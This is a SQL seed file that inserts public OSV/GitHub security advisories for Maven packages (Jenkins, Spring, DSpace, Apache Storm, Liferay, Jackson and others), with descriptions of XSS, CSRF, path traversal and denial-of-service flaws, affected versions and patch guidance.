INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6g4r-q7qg-6qx6', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Cross-site Scripting vulnerability in Jenkins', 'Since Jenkins 2.340, the tooltip of the build button in list views supports HTML without escaping the job display name.

This vulnerability is known to be exploitable by attackers with Job/Configure permission.

Jenkins 2.356 addresses this vulnerability. The tooltip of the build button in list views is now escaped.

No Jenkins LTS release is affected by SECURITY-2776 or SECURITY-2780, as these were not present in Jenkins 2.332.x and fixed in the 2.346.x line before 2.346.1.', '["2.340", "2.341", "2.342", "2.343", "2.344", "2.345", "2.346", "2.346.1", "2.346.2", "2.346.3", "2.347", "2.348", "2.349", "2.350", "2.354", "2.355"]'::jsonb, '0.0', '2022-06-24 00:00:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-mv77-fj63-q5w8', 'OSV', 'com.coravy.hudson.plugins.github:github', 'maven', 'Stored XSS vulnerability in Jenkins GitHub Plugin', 'Jenkins GitHub Plugin 1.37.3 and earlier does not escape the GitHub project URL on the build page when showing changes.

This results in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item/Configure permission.

GitHub Plugin 1.37.3.1 escapes GitHub project URL on the build page when showing changes.', '["0.1", "0.2", "0.3", "0.4", "0.5", "0.6", "0.7", "0.8", "0.9", "1.0", "1.1", "1.10", "1.11", "1.11.1", "1.11.2", "1.11.3", "1.12.0", "1.12.0-alpha-1", "1.12.1", "1.13.0", "1.13.0-alpha-1", "1.13.0-alpha-2", "1.13.1", "1.13.2", "1.13.3", "1.14.0", "1.14.0-alpha-1", "1.14.0-alpha-2", "1.14.1", "1.14.2", "1.15.0", "1.16.0", "1.17.0", "1.17.1", "1.18.0", "1.18.1", "1.18.2", "1.19.0", "1.19.1", "1.19.2", "1.19.3", "1.2", "1.20.0", "1.21.0", "1.21.1", "1.22.0", "1.22.1", "1.22.2", "1.22.3", "1.22.4", "1.23.0", "1.23.1", "1.24.0", "1.25.0", "1.25.1", "1.26.0", "1.26.1", "1.26.2", "1.27.0", "1.28.0", "1.28.1", "1.29.0", "1.29.1", "1.29.2", "1.29.3", "1.29.4", "1.29.5", "1.3", "1.30.0", "1.31.0", "1.32.0", "1.33.0", "1.33.1", "1.34.0", "1.34.1", "1.34.1.1", "1.34.2", "1.34.3", "1.34.3.1", "1.34.4", "1.34.5", "1.35.0", "1.36.0", "1.36.1", "1.37.0", "1.37.1", "1.37.2", "1.37.3", "1.4", "1.5", "1.6", "1.7", "1.8", "1.9", "1.9.1"]'::jsonb, '0.0', '2023-10-25 18:32:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-phwv-crgp-9r69', 'OSV', 'org.jenkins-ci.plugins:github-oauth', 'maven', 'Jenkins GitHub Authentication Plugin Cross-Site Request Forgery vulnerability', 'Jenkins GitHub Authentication Plugin did not manage the state parameter of OAuth to prevent CSRF. This allowed an attacker to catch the redirect URL provided during the authentication process using OAuth and send it to the victim. If the victim was already connected to Jenkins, their Jenkins account would be attached to the attacker’s GitHub account.

The state parameter is now correctly managed.', '["-rc586.88708ce878fc", "0.1", "0.10", "0.11", "0.12", "0.13", "0.13.1", "0.14", "0.16", "0.17", "0.18", "0.19", "0.2", "0.20", "0.21", "0.21.1", "0.21.2", "0.22", "0.22.1", "0.22.2", "0.22.3", "0.23", "0.24", "0.25", "0.26", "0.27", "0.28.1", "0.29", "0.3", "0.31", "0.4", "0.5", "0.6", "0.7", "0.8", "0.8.1", "0.9"]'::jsonb, '0.0', '2022-05-24 16:44:55+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-274r-p6v6-fhh4', 'OSV', 'org.springframework.batch:spring-batch-admin-manager', 'maven', 'Spring Batch Admin vulnerable to Cross-site request forgery (CSRF) in the file upload functionality', 'Cross-site request forgery (CSRF) vulnerability in the Spring Batch Admin before 1.3.0 allows remote attackers to hijack the authentication of unspecified victims and submit arbitrary requests, such as exploiting the file upload vulnerability.', '["1.0.0.RELEASE", "1.2.0.RELEASE", "1.2.1.RELEASE", "1.2.2.RELEASE"]'::jsonb, '0.0', '2022-05-17 01:57:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jqj4-r483-4gvr', 'OSV', 'com.vaadin:vaadin-bom', 'maven', 'Reflected cross-site scripting in default RouteNotFoundError view in Vaadin 10 and 11-13', 'Missing output sanitization in default `RouteNotFoundError` view in `com.vaadin:flow-server` versions 1.0.0 through 1.0.10 (Vaadin 10.0.0 through 10.0.13), and 1.1.0 through 1.4.2 (Vaadin 11.0.0 through 13.0.5) allows attacker to execute malicious JavaScript via crafted URL.

- https://vaadin.com/security/cve-2019-25027', '["11.0.0", "11.0.1", "11.0.2", "11.0.3", "11.0.4", "12.0.0", "12.0.1", "12.0.2", "12.0.3", "12.0.4", "12.0.5", "12.0.6", "12.0.7", "13.0.0", "13.0.1", "13.0.2", "13.0.3", "13.0.4", "13.0.5"]'::jsonb, '0.0', '2021-04-19 14:48:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-vhvx-8xgc-99wf', 'OSV', 'org.dspace:dspace-api', 'maven', 'DSpace is vulnerable to Path Traversal attacks when importing packages using Simple Archive Format', '### Impact

A path traversal vulnerability is possible during the import of an archive (in [Simple Archive Format](https://wiki.lyrasis.org/pages/viewpage.action?pageId=104566653)), either from command-line (`./dspace import` command) or from the "Batch Import (Zip)" user interface feature.  _This vulnerability likely impacts all versions of DSpace 1.x <= 7.6.3, 8.0 <= 8.1, and 9.0_.

An attacker may craft a malicious Simple Archive Format (SAF) package where the `contents` file references any system files (using relative traversal sequences) which are readable by the Tomcat user.  If such a package is imported, this will result in sensitive content disclose, including retrieving arbitrary files or configurations from the server where DSpace is running.

**The Simple Archive Format (SAF) importer / Batch Import (Zip) is only usable by site administrators** (from user interface / REST API) or system administrators (from command-line).  Therefore, to exploit this vulnerability, the malicious payload would have to be provided by an attacker and trusted by an administrator (who would trigger the import).
* **The most severe practical impact** is a case where an attacker obtains DSpace administrator credentials and uses the Batch Import feature with a malicious SAF archive to expose sensitive local files readable by the Tomcat user.
* An attacker without administrative credentials might use some other tactic to convince an administrator to import a malicious SAF archive they have supplied.

### Patches

The fix is included in DSpace 7.6.4, 8.2 and 9.1. Please upgrade to one of these versions.

If you cannot upgrade immediately, it is possible to manually patch your DSpace backend. (No changes are necessary to the frontend.)  A pull request exists which can be used to patch systems running DSpace 7.6.x, 8.x or 9.0. This pull request provides validation checks of paths in the `contents` file of an SAF package to ensure it does not reference any files outside of the SAF package.
* Pull request for 7.x: https://github.com/DSpace/DSpace/pull/11036 ([Downloadable patch file](https://github.com/DSpace/DSpace/pull/11036.patch))
* Pull request for 8.x: https://github.com/DSpace/DSpace/pull/11037 ([Downloadable patch file](https://github.com/DSpace/DSpace/pull/11037.patch))
* Pull request for 9.0: https://github.com/DSpace/DSpace/pull/11038 ([Downloadable patch file](https://github.com/DSpace/DSpace/pull/11038.patch))

#### Apply the patch to your DSpace
If at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches to your DSpace backend as follows:
1. Download the appropriate patch file to the machine where DSpace backend is running
2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`
3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:
    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace backend code)
    2. Redeploy DSpace, e.g. `ant update`  (This will copy all newly built code to your installation directory). Depending on your setup you also may need to copy the updated "server" webapp over to your Tomcat webapps folder.
    3. Restart Tomcat (or runnable JAR)

### Workarounds
**Patching the system is the recommended fix.** It is not possible to fully protect your system via workarounds.

That said, until you are able to patch your system or upgrade, you can apply these best practices:
* Administrators must carefully inspect any SAF archives (they did not construct themselves) before importing, paying close attention to the `contents` file to validate it does not reference files outside of the SAF archives.
* If SAF archives are too large to manually inspect, you should avoid importing them until your site is patched.

### Credits
Discovered & reported by Marcin Miłosz (@MMilosz) of PCG Academia
Code fix developed by Marcin Miłosz of PCG Academia and Kim Shepherd (@kshepherd) of The Library Code

### For more information
* [Path Traversal Vulnerability explained](https://owasp.org/www-community/attacks/Path_Traversal)
* If you have any questions or comments about this advisory, please contact us at [security@dspace.org](mailto:security@dspace.org)', '["9.0"]'::jsonb, '0.0', '2025-07-15 18:05:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4g9c-3x4p-mfpp', 'OSV', 'org.springframework.grpc:spring-grpc', 'maven', 'Spring gRPC SecurityContext leaks across requests upon authorization failure', 'When an authenticated user is denied access to a gRPC method, their authenticated identity remains bound to the gRPC worker thread and can be inherited by a subsequent unauthenticated request on the same thread. This may allow the subsequent user to gain escalated permissions.

Affected versions:
Spring gRPC: 1.0.0 - 1.0.2 (fixed in 1.0.3). Older, unsupported versions are also affected.', '["0.1.0", "0.10.0", "0.11.0", "0.12.0", "0.2.0", "0.3.0", "0.4.0", "0.5.0", "0.6.0", "0.7.0", "0.8.0", "0.9.0", "1.0.0", "1.0.0-RC1", "1.0.1", "1.0.2"]'::jsonb, '0.0', '2026-04-28 15:30:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-f2hp-qw27-8wfq', 'OSV', 'org.apache.storm:storm-webapp', 'maven', ' Apache Storm UI: Stored Cross-Site Scripting (XSS) via Unsanitized Topology Metadata', 'Stored Cross-Site Scripting (XSS) via Unsanitized Topology Metadata in Apache Storm UI


Versions Affected: before 2.8.6


Description: The Storm UI visualization component interpolates topology metadata including component IDs, stream names, and grouping values directly into HTML via innerHTML in parseNode() and parseEdge() without sanitization at any layer. An authenticated user with topology submission rights could craft a topology containing malicious HTML/JavaScript in component identifiers (e.g., a bolt ID containing an onerror event handler). This payload flows through Nimbus → Thrift → the Visualization API → vis.js tooltip rendering, resulting in stored cross-site scripting. 

In multi-tenant deployments where topology submission is available to less-trusted users but the UI is accessed by operators or administrators, this enables privilege escalation through script execution in an admin''s browser session.


Mitigation: 2.x users should upgrade to 2.8.6. Users who cannot upgrade immediately should monkey-patch the parseNode() and parseEdge() functions in the visualization JavaScript file to HTML-escape all API-supplied values including nodeId, :capacity, :latency, :component, :stream, and :grouping before interpolation into tooltip HTML strings, and should additionally restrict topology submission to trusted users via Nimbus ACLs as a defense-in-depth measure. A guide on how to do this is available in the release notes of 2.8.6.

Credit: This issue was discovered while investigating another report by K.', '["2.0.0", "2.1.0", "2.1.1", "2.2.0", "2.2.1", "2.3.0", "2.4.0", "2.5.0", "2.6.0", "2.6.1", "2.6.2", "2.6.3", "2.6.4", "2.7.0", "2.7.1", "2.8.0", "2.8.1", "2.8.2", "2.8.3", "2.8.4", "2.8.5"]'::jsonb, '0.0', '2026-04-13 12:31:15+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c9h6-xhg9-xxrv', 'OSV', 'org.apache.qpid:apache-qpid-broker-j', 'maven', 'Improper Input Validation in Apache Qpid Broker-J', 'A Denial of Service vulnerability was found in Apache Qpid Broker-J versions 6.0.0-7.0.6 (inclusive) and 7.1.0 which allows an unauthenticated attacker to crash the broker instance by sending specially crafted commands using AMQP protocol versions below 1.0 (AMQP 0-8, 0-9, 0-91 and 0-10). Users of Apache Qpid Broker-J versions 6.0.0-7.0.6 (inclusive) and 7.1.0 utilizing AMQP protocols 0-8, 0-9, 0-91, 0-10 must upgrade to Qpid Broker-J versions 7.0.7 or 7.1.1 or later.', '["7.1.0"]'::jsonb, '0.0', '2019-03-07 18:48:08+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6qcg-28jh-hm7r', 'OSV', 'com.liferay:com.liferay.blogs.web', 'maven', 'Liferay Portal Reflected XSS in blogs-web', 'A reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.0 through 7.4.3.133, and Liferay DXP 2025.Q1.0 through 2025.Q1.4 ,2024.Q4.0 through 2024.Q4.7, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.15, 7.4 GA through update 92 allows an remote non-authenticated attacker to inject JavaScript into the `modules/apps/blogs/blogs-web/src/main/resources/META-INF/resources/blogs/entry_cover_image_caption.jsp`.', '["1.0.0", "1.0.1", "1.0.10", "1.0.11", "1.0.12", "1.0.13", "1.0.14", "1.0.15", "1.0.16", "1.0.17", "1.0.18", "1.0.19", "1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7", "1.0.8", "1.0.9", "1.1.0", "1.1.1", "1.1.10", "1.1.11", "1.1.12", "1.1.13", "1.1.14", "1.1.15", "1.1.16", "1.1.17", "1.1.18", "1.1.19", "1.1.2", "1.1.20", "1.1.21", "1.1.22", "1.1.23", "1.1.24", "1.1.25", "1.1.26", "1.1.27", "1.1.28", "1.1.29", "1.1.3", "1.1.30", "1.1.31", "1.1.4", "1.1.5", "1.1.6", "1.1.7", "1.1.8", "1.1.9", "2.0.0", "2.0.1", "2.0.10", "2.0.11", "2.0.12", "2.0.13", "2.0.14", "2.0.15", "2.0.16", "2.0.17", "2.0.18", "2.0.19", "2.0.2", "2.0.20", "2.0.21", "2.0.22", "2.0.23", "2.0.24", "2.0.25", "2.0.26", "2.0.27", "2.0.28", "2.0.29", "2.0.3", "2.0.30", "2.0.31", "2.0.32", "2.0.33", "2.0.34", "2.0.35", "2.0.36", "2.0.37", "2.0.38", "2.0.39", "2.0.4", "2.0.40", "2.0.41", "2.0.42", "2.0.43", "2.0.44", "2.0.45", "2.0.46", "2.0.47", "2.0.48", "2.0.49", "2.0.5", "2.0.50", "2.0.51", "2.0.52", "2.0.53", "2.0.54", "2.0.55", "2.0.56", "2.0.57", "2.0.58", "2.0.59", "2.0.6", "2.0.60", "2.0.61", "2.0.62", "2.0.63", "2.0.64", "2.0.65", "2.0.66", "2.0.67", "2.0.68", "2.0.69", "2.0.7", "2.0.70", "2.0.71", "2.0.72", "2.0.73", "2.0.74", "2.0.8", "2.0.9", "3.0.0", "3.0.1", "3.0.10", "3.0.100", "3.0.101", "3.0.102", "3.0.103", "3.0.104", "3.0.105", "3.0.106", "3.0.107", "3.0.108", "3.0.11", "3.0.12", "3.0.13", "3.0.14", "3.0.15", "3.0.16", "3.0.17", "3.0.18", "3.0.19", "3.0.2", "3.0.20", "3.0.21", "3.0.22", "3.0.23", "3.0.24", "3.0.25", "3.0.26", "3.0.27", "3.0.28", "3.0.29", "3.0.3", "3.0.30", "3.0.31", "3.0.32", "3.0.33", "3.0.34", "3.0.35", "3.0.36", "3.0.37", "3.0.38", "3.0.39", "3.0.4", "3.0.40", "3.0.41", "3.0.42", "3.0.43", "3.0.44", "3.0.45", "3.0.46", "3.0.47", "3.0.48", "3.0.49", "3.0.5", "3.0.50", "3.0.51", "3.0.52", "3.0.53", "3.0.54", "3.0.55", "3.0.56", "3.0.57", "3.0.58", "3.0.59", "3.0.6", "3.0.60", "3.0.61", "3.0.62", "3.0.63", "3.0.64", "3.0.65", "3.0.66", "3.0.67", "3.0.68", "3.0.69", "3.0.7", "3.0.70", "3.0.71", "3.0.72", "3.0.73", "3.0.74", "3.0.75", "3.0.76", "3.0.77", "3.0.78", "3.0.79", "3.0.8", "3.0.80", "3.0.81", "3.0.82", "3.0.83", "3.0.84", "3.0.85", "3.0.86", "3.0.87", "3.0.88", "3.0.89", "3.0.9", "3.0.90", "3.0.91", "3.0.92", "3.0.93", "3.0.94", "3.0.95", "3.0.96", "3.0.97", "3.0.98", "3.0.99", "4.0.0", "4.0.1", "4.0.10", "4.0.100", "4.0.101", "4.0.102", "4.0.103", "4.0.104", "4.0.105", "4.0.106", "4.0.107", "4.0.108", "4.0.11", "4.0.12", "4.0.13", "4.0.14", "4.0.15", "4.0.16", "4.0.17", "4.0.18", "4.0.19", "4.0.2", "4.0.20", "4.0.21", "4.0.22", "4.0.23", "4.0.24", "4.0.25", "4.0.26", "4.0.27", "4.0.28", "4.0.29", "4.0.3", "4.0.30", "4.0.31", "4.0.32", "4.0.33", "4.0.34", "4.0.35", "4.0.36", "4.0.37", "4.0.38", "4.0.39", "4.0.4", "4.0.40", "4.0.41", "4.0.42", "4.0.43", "4.0.44", "4.0.45", "4.0.46", "4.0.47", "4.0.48", "4.0.49", "4.0.5", "4.0.50", "4.0.51", "4.0.52", "4.0.53", "4.0.54", "4.0.55", "4.0.56", "4.0.57", "4.0.58", "4.0.59", "4.0.6", "4.0.60", "4.0.61", "4.0.62", "4.0.63", "4.0.64", "4.0.65", "4.0.66", "4.0.67", "4.0.68", "4.0.69", "4.0.7", "4.0.70", "4.0.71", "4.0.72", "4.0.73", "4.0.74", "4.0.75", "4.0.76", "4.0.77", "4.0.78", "4.0.79", "4.0.8", "4.0.80", "4.0.81", "4.0.82", "4.0.83", "4.0.84", "4.0.85", "4.0.86", "4.0.87", "4.0.88", "4.0.89", "4.0.9", "4.0.90", "4.0.91", "4.0.92", "4.0.93", "4.0.94", "4.0.95", "4.0.96", "4.0.97", "4.0.98", "4.0.99", "5.0.0", "5.0.1", "5.0.10", "5.0.11", "5.0.12", "5.0.13", "5.0.14", "5.0.15", "5.0.16", "5.0.17", "5.0.18", "5.0.19", "5.0.2", "5.0.20", "5.0.21", "5.0.22", "5.0.23", "5.0.24", "5.0.25", "5.0.26", "5.0.27", "5.0.28", "5.0.29", "5.0.3", "5.0.30", "5.0.31", "5.0.32", "5.0.33", "5.0.34", "5.0.35", "5.0.36", "5.0.37", "5.0.38", "5.0.39", "5.0.4", "5.0.40", "5.0.41", "5.0.42", "5.0.43", "5.0.44", "5.0.45", "5.0.46", "5.0.47", "5.0.48", "5.0.49", "5.0.5", "5.0.50", "5.0.51", "5.0.52", "5.0.53", "5.0.54", "5.0.55", "5.0.56", "5.0.57", "5.0.58", "5.0.59", "5.0.6", "5.0.60", "5.0.61", "5.0.62", "5.0.63", "5.0.64", "5.0.65", "5.0.66", "5.0.67", "5.0.68", "5.0.69", "5.0.7", "5.0.70", "5.0.71", "5.0.72", "5.0.73", "5.0.74", "5.0.75", "5.0.76", "5.0.77", "5.0.78", "5.0.79", "5.0.8", "5.0.80", "5.0.81", "5.0.82", "5.0.83", "5.0.84", "5.0.85", "5.0.86", "5.0.87", "5.0.88", "5.0.89", "5.0.9", "5.0.90", "5.0.91", "5.0.92", "5.0.93", "5.0.94", "5.0.95", "6.0.0", "6.0.1", "6.0.10", "6.0.100", "6.0.101", "6.0.102", "6.0.103", "6.0.104", "6.0.105", "6.0.106", "6.0.107", "6.0.108", "6.0.109", "6.0.11", "6.0.110", "6.0.111", "6.0.112", "6.0.113", "6.0.114", "6.0.115", "6.0.116", "6.0.117", "6.0.118", "6.0.119", "6.0.12", "6.0.120", "6.0.121", "6.0.122", "6.0.123", "6.0.124", "6.0.125", "6.0.126", "6.0.127", "6.0.128", "6.0.129", "6.0.13", "6.0.130", "6.0.131", "6.0.132", "6.0.133", "6.0.134", "6.0.135", "6.0.136", "6.0.137", "6.0.138", "6.0.14", "6.0.15", "6.0.16", "6.0.17", "6.0.18", "6.0.19", "6.0.2", "6.0.20", "6.0.21", "6.0.22", "6.0.23", "6.0.24", "6.0.25", "6.0.26", "6.0.27", "6.0.28", "6.0.29", "6.0.3", "6.0.30", "6.0.31", "6.0.32", "6.0.33", "6.0.34", "6.0.35", "6.0.36", "6.0.37", "6.0.38", "6.0.39", "6.0.4", "6.0.40", "6.0.41", "6.0.42", "6.0.43", "6.0.44", "6.0.45", "6.0.46", "6.0.47", "6.0.48", "6.0.49", "6.0.5", "6.0.50", "6.0.51", "6.0.52", "6.0.53", "6.0.54", "6.0.55", "6.0.56", "6.0.57", "6.0.58", "6.0.59", "6.0.6", "6.0.60", "6.0.61", "6.0.62", "6.0.63", "6.0.64", "6.0.65", "6.0.66", "6.0.67", "6.0.68", "6.0.69", "6.0.7", "6.0.70", "6.0.71", "6.0.72", "6.0.73", "6.0.74", "6.0.75", "6.0.76", "6.0.77", "6.0.78", "6.0.79", "6.0.8", "6.0.80", "6.0.81", "6.0.82", "6.0.83", "6.0.84", "6.0.85", "6.0.86", "6.0.87", "6.0.88", "6.0.89", "6.0.9", "6.0.90", "6.0.91", "6.0.92", "6.0.93", "6.0.94", "6.0.95", "6.0.96", "6.0.97", "6.0.98", "6.0.99"]'::jsonb, '0.0', '2025-08-08 18:32:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hg2w-3c4j-jjwm', 'OSV', 'org.jenkins-ci.plugins:repository-connector', 'maven', 'Stored XSS vulnerability in Jenkins Repository Connector Plugin', 'Jenkins Repository Connector Plugin 2.0.2 and earlier does not escape parameter names and descriptions for past builds.

This results in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item/Configure permission.

Jenkins Repository Connector Plugin 2.0.3 escapes parameter names and descriptions when creating new parameters.', '["1.0.0", "1.0.1", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.2.3", "1.2.4", "1.2.5", "1.2.6", "1.3.1", "2.0.0", "2.0.1", "2.0.2"]'::jsonb, '0.0', '2022-05-24 17:43:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-cxqw-vjcr-gp5g', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Excessive memory allocation in graph URLs leads to denial of service in Jenkins', 'Jenkins renders several different graphs for features like agent and label usage statistics, memory usage, or various plugin-provided statistics.

Jenkins 2.274 and earlier, LTS 2.263.1 and earlier does not limit the graph size provided as query parameters.

This allows attackers to request or to have legitimate Jenkins users request crafted URLs that rapidly use all available memory in Jenkins, potentially leading to out of memory errors.

Jenkins 2.275, LTS 2.263.2 limits the maximum size of graphs to an area of 10 million pixels. If a larger size is requested, the default size for the graph will be rendered instead.

This threshold can be configured by setting the [Java system property](https://www.jenkins.io/doc/book/managing/system-properties/) `hudson.util.Graph.maxArea` to a different number on startup.', '["2.264", "2.265", "2.266", "2.267", "2.268", "2.269", "2.270", "2.271", "2.272", "2.273", "2.274"]'::jsonb, '0.0', '2022-05-24 17:39:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5843-p793-ghmm', 'OSV', 'org.springframework:spring-webflux', 'maven', 'Spring Framework DoS with Multipart Temp Files in WebFlux', 'A WebFlux server application that processes multipart requests creates temp files for parts larger than 10 K. Under some circumstances, temp files may remain not deleted after the request is fully processed. This allows an attacker to consume available disk space.

Older, unsupported versions are also affected.', '["5.0.0.RELEASE", "5.0.1.RELEASE", "5.0.10.RELEASE", "5.0.11.RELEASE", "5.0.12.RELEASE", "5.0.13.RELEASE", "5.0.14.RELEASE", "5.0.15.RELEASE", "5.0.16.RELEASE", "5.0.17.RELEASE", "5.0.18.RELEASE", "5.0.19.RELEASE", "5.0.2.RELEASE", "5.0.20.RELEASE", "5.0.3.RELEASE", "5.0.4.RELEASE", "5.0.5.RELEASE", "5.0.6.RELEASE", "5.0.7.RELEASE", "5.0.8.RELEASE", "5.0.9.RELEASE", "5.1.0.RELEASE", "5.1.1.RELEASE", "5.1.10.RELEASE", "5.1.11.RELEASE", "5.1.12.RELEASE", "5.1.13.RELEASE", "5.1.14.RELEASE", "5.1.15.RELEASE", "5.1.16.RELEASE", "5.1.17.RELEASE", "5.1.18.RELEASE", "5.1.19.RELEASE", "5.1.2.RELEASE", "5.1.20.RELEASE", "5.1.3.RELEASE", "5.1.4.RELEASE", "5.1.5.RELEASE", "5.1.6.RELEASE", "5.1.7.RELEASE", "5.1.8.RELEASE", "5.1.9.RELEASE", "5.2.0.RELEASE", "5.2.1.RELEASE", "5.2.10.RELEASE", "5.2.11.RELEASE", "5.2.12.RELEASE", "5.2.13.RELEASE", "5.2.14.RELEASE", "5.2.15.RELEASE", "5.2.16.RELEASE", "5.2.17.RELEASE", "5.2.18.RELEASE", "5.2.19.RELEASE", "5.2.2.RELEASE", "5.2.20.RELEASE", "5.2.21.RELEASE", "5.2.22.RELEASE", "5.2.23.RELEASE", "5.2.24.RELEASE", "5.2.25.RELEASE", "5.2.3.RELEASE", "5.2.4.RELEASE", "5.2.5.RELEASE", "5.2.6.RELEASE", "5.2.7.RELEASE", "5.2.8.RELEASE", "5.2.9.RELEASE", "5.3.0", "5.3.1", "5.3.10", "5.3.11", "5.3.12", "5.3.13", "5.3.14", "5.3.15", "5.3.16", "5.3.17", "5.3.18", "5.3.19", "5.3.2", "5.3.20", "5.3.21", "5.3.22", "5.3.23", "5.3.24", "5.3.25", "5.3.26", "5.3.27", "5.3.28", "5.3.29", "5.3.3", "5.3.30", "5.3.31", "5.3.32", "5.3.33", "5.3.34", "5.3.35", "5.3.36", "5.3.37", "5.3.38", "5.3.39", "5.3.4", "5.3.5", "5.3.6", "5.3.7", "5.3.8", "5.3.9"]'::jsonb, '0.0', '2026-04-29 12:33:07+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c5xv-qc8p-mh2v', 'OSV', 'org.apache.xmlgraphics:batik', 'maven', 'Apache Batik Server-Side Request Forgery ', 'Server-Side Request Forgery (SSRF) vulnerability in Batik of Apache XML Graphics allows an attacker to load a url thru the jar protocol. This issue affects Apache XML Graphics Batik 1.14.', '["1.14"]'::jsonb, '0.0', '2022-09-23 00:00:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4wx5-c723-xvwv', 'OSV', 'org.fedoraproject.jenkins.plugins:copr', 'maven', 'Credentials stored in plain text by Jenkins Copr Plugin', 'Copr Plugin 0.3 and earlier stores credentials unencrypted in job `config.xml` files as part of its configuration. These credentials can be viewed by users with Extended Read permission or access to the Jenkins controller file system.

Copr Plugin 0.6.1 stores these credentials encrypted. This change is effective once the job configuration is saved the next time.', '["0.1", "0.2", "0.3"]'::jsonb, '0.0', '2022-05-24 17:15:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jjjh-jjxp-wpff', 'OSV', 'com.fasterxml.jackson.core:jackson-databind', 'maven', 'Uncontrolled Resource Consumption in Jackson-databind', 'In FasterXML jackson-databind 2.4.0-rc1 until 2.12.7.1 and in 2.13.x before 2.13.4.2 resource exhaustion can occur because of a lack of a check in primitive value deserializers to avoid deep wrapper array nesting, when the UNWRAP_SINGLE_VALUE_ARRAYS feature is enabled. This was patched in 2.12.7.1, 2.13.4.2, and 2.14.0.

Commits that introduced vulnerable code are 
https://github.com/FasterXML/jackson-databind/commit/d499f2e7bbc5ebd63af11e1f5cf1989fa323aa45, https://github.com/FasterXML/jackson-databind/commit/0e37a39502439ecbaa1a5b5188387c01bf7f7fa1, and https://github.com/FasterXML/jackson-databind/commit/7ba9ac5b87a9d6ac0d2815158ecbeb315ad4dcdc.

Fix commits are https://github.com/FasterXML/jackson-databind/commit/cd090979b7ea78c75e4de8a4aed04f7e9fa8deea and https://github.com/FasterXML/jackson-databind/commit/d78d00ee7b5245b93103fef3187f70543d67ca33.

The `2.13.4.1` release does fix this issue, however it also references a non-existent jackson-bom which causes build failures for gradle users. See https://github.com/FasterXML/jackson-databind/issues/3627#issuecomment-1277957548 for details. This is fixed in `2.13.4.2` which is listed in the advisory metadata so that users are not subjected to unnecessary build failures', '["2.13.0", "2.13.1", "2.13.2", "2.13.2.1", "2.13.2.2", "2.13.3", "2.13.4", "2.13.4.1"]'::jsonb, '0.0', '2022-10-03 00:00:31+00') ON CONFLICT (id) DO NOTHING;
